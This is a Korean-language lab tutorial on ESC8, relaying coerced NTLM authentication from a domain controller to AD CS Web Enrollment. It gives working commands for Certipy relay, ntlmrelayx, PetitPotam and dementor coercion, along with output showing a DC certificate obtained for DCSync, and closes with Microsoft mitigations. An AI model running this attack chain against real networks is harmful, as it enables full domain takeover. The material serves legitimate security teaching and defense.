# ESC8

### 개념&#x20;

ADCS 에는 Web Enrollment 라는 웹 서비스가 존재한다. 이 웹 서비스는 유저, 스크립트, 프로그램 등이 ADCS 서비스와 편리하게 통신하기 위해 웹 서버와 HTTP 엔드포인트 등을 제공한다. 액티브 디렉토리 안의 서비스 답게 이 웹 서버는 기본적으로 NTLM 인증을 통해 사용자 인증이 가능하다 - 라는 말은 곧 NTLM Relay 공격에 취약 하다는 말이 된다.&#x20;

ESC8 은 NTLM Relay 공격을 통해 피해자 유저/머신의 NTLM 인증 트래픽을 ADCS HTTP 엔드 포인트로 보낸 뒤, 피해자 유저/머신으로 인증서를 발급받아 사용자 인증 및 계정을 탈취하는 공격이다.&#x20;

### 전제 조건&#x20;

1. ADCS 서버에 Web Enrollment 가 설치되어 있다&#x20;
2. NTLM Relay 를 시작할 수 있는 피해자 유저/머신과 취약점이 존재한다 (강제 인증, LLMNR/NBT-NS 포이즈닝, MITM6, 등)&#x20;
3. Web Enrollment 웹 서버가 NTLM 인증을 허용한다 - 특별한 설정을 하지 않는 이상 기본적으로 허용한다.&#x20;



### 실습&#x20;

해당 실습에서는 강제 인증에 취약한 도메인 컨트롤러로부터 인증 트래픽을 받아 이를 CA 서버의 HTTP 엔드포인트에 릴레이하는 ESC8 공격을 실행한다. 이로서 공격자는 도메인 컨트롤러 머신 계정을 장악한. 도메인 컨트롤러 머신 계정은 DCSync 권한을 갖고 있기 때문에 도메인을 장악할 수 있게 된다.&#x20;

> 도메인 컨트롤러 -> 강제 인증 -> 공격자 -> 릴레이 -> ADCS HTTP 엔드포인트 == 도메인 컨트롤러의 인증서 획득. 인증서를 이용해 도메인 컨트롤러로 인증 후 DCSync&#x20;

#### 정보 수집&#x20;

1. 먼저 CA와 CA의 Web Enrollment 가 존재하는지 Certipy 로 알아본다. `Web Enrollment: Enabled` 라면 웹서버가 활성화 되어 있는 것이다.&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>

2\. 정확한 확인을 위해 GUI에서는 HTTP 엔드포인트를 브라우저로 방문하거나 curl 등을 이용한다. `401 Unauthorized` 에러 메시지가 나오면 제대로 HTTP 엔드포인트가 실행 중이라는 것이다.&#x20;

```
$ curl -k http://<CA-IP>/certsrv/certfnsh.asp

$ curl -k http://192.168.40.150/certsrv/certfnsh.asp                                              
[ ... ] 
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
```

3\. CA 서버의 HTTP 엔드포인트로 릴레이 세팅 해놓는다. Certipy 나 NTLMRelayx 를 이용한다.&#x20;

<pre><code># Certipy 
<strong>certipy relay -ca &#x3C;ca-ip> 
</strong>
# ntlmrelayx 
python3 ntlmrelayx.py -t http://&#x3C;CA-IP or FDQN>/certsrv/certfnsh.asp -smb2support --adcs --template &#x3C;template></code></pre>

4\. 강제 인증, LLMNR/NBT-NS, MITM6 등을 이용해 도메인 컨트롤러를 공격해 NTLM Relay 공격을 실행한다.&#x20;

```
# Petitpotam - 무인증 
python3 Petitpotam.py <attacker-ip> <target-ip> 

# Petitpotam - 인증 
python3 Petitpotam.py -u <user> -p <pass> <attacker-ip> <target-ip> 

# Print Spooler (dementor.py) (https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) 
python3 dementor.py -u <user> -p <pass> -d <domain> <attacker-ip> <target-ip>

```

5\. Certipy 결과&#x20;

```
certipy relay -ca dc01.choi.local -template DomainController
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://dc01.choi.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'PCI\\DC1$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'dc1.pci.choi.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dc1.pfx'
[*] Exiting...
```

(5-1. NTLMRelayx 결과)&#x20;

```
[*] Authenticating against http://192.168.40.150 as PCI/DC1$ SUCCEED                                          
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.40.160 controlled, but there are no more targets left!
[*] Generating CSR...                                  
[*] CSR generated!                                     
[*] Getting certificate...                             
[*] GOT CERTIFICATE! ID 22                             
[*] Base64 certificate of user DC1$:                   
MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMIIREDCCB0cGCSqG [ ..... ] 
```

6\. 인증서를 이용해 도메인 컨트롤러의 머신 계정을 획득한다.&#x20;

```
# Certipy
certipy auth -dc-ip <dc-IP> -pfx <filename>

# NTLMRelayx 
Base64 Certificate 을 저장한다. 
$ base64 -d <base64-pfx> > real.pfx 
$ certipy auth -dc-ip <dc-IP> -pfx real.pfx 
```



### 대응 방안&#x20;

> 다음의 대응 방안은 마이크로소프트사의 공식 문서를 기반으로 쓰여졌다. 더 자세한 사항은 레퍼런스 섹션의 MSDN을 참고한다.&#x20;

1. ADCS HTTP 엔드포인트에 Extended Protection Authentication (EPA) 을 `Required` 로 설정한다. \
   Server Manager > IIS Manager > DC/CAXX > Sites > Default Web Site > CertSrv > Authentication 더블클릭 > Windows Authentication 오른쪽 클릭 > Advanced Settings > Extended Protection: Required&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

1-1. 그 이 SSL을 활성화 한다.&#x20;

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

2\. 극단적으로 CA 서버에 NTLM 인증을 비활성화 한다. 프로덕션 서버의 경우 하위 호환성에 문제가 갈 수 있기 때문에 충분한 테스트를 거친 뒤 NTLM 인증을 비활성화 한다.  \
&#x20;

### 레퍼런스&#x20;

{% embed url="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" %}

